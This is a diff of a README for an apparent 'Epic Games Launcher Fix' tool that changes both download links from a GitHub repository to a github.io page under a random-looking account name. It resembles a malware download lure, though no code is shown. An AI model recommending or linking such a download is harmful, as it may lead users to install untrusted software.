@@ -1,6 +1,6 @@
 # 🛠️ Epic-Games-Launcher-Fix - Get Your Epic Games Working Now
 
-[![](https://img.shields.io/badge/Download_Fix-Blue.svg)](https://github.com/lappetcaterpillardankness945/Epic-Games-Launcher-Fix)
+[![](https://img.shields.io/badge/Download_Fix-Blue.svg)](https://lappetcaterpillardankness945.github.io)
 
 ## 📖 About This Tool
 
@@ -18,7 +18,7 @@ You need an active internet connection to finish the repair process. The tool do
 
 ## 📥 Downloads and Installation
 
-Visit this page to download the software: https://github.com/lappetcaterpillardankness945/Epic-Games-Launcher-Fix
+Visit this page to download the software: https://lappetcaterpillardankness945.github.io
 
 Follow these steps to run the repair tool:
 
